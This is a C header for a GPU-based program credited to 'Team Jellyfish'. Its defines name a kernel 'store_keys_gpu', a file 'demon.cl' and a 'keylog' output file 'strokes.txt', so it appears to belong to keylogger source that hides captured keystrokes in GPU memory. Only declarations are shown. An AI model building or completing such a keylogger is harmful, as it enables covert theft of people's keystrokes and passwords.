/*
 
Copyright (C) 2015  Team Jellyfish
 
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.
 
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
 
*/

#ifndef DEMON_H
#define DEMON_H

#include <CL/cl.h>

#define GPU_LOGGER "demon.cl"
#define KERNEL_FUNC "store_keys_gpu"
#define VRAM_LIMIT 10485760  // 10mb
#define keylog "strokes.txt"

struct jellyfish{
    cl_context ctx;
    cl_device_id dev;
    cl_platform_id platform;
    cl_command_queue cq;
    cl_program program;
    cl_kernel kernel;
};

typedef struct jellyfish *jelly;

// globals
char *buffer, *buffer2;
cl_mem in, out;
cl_int err;
size_t global_size = 2;
size_t local_size = 0;

#endif
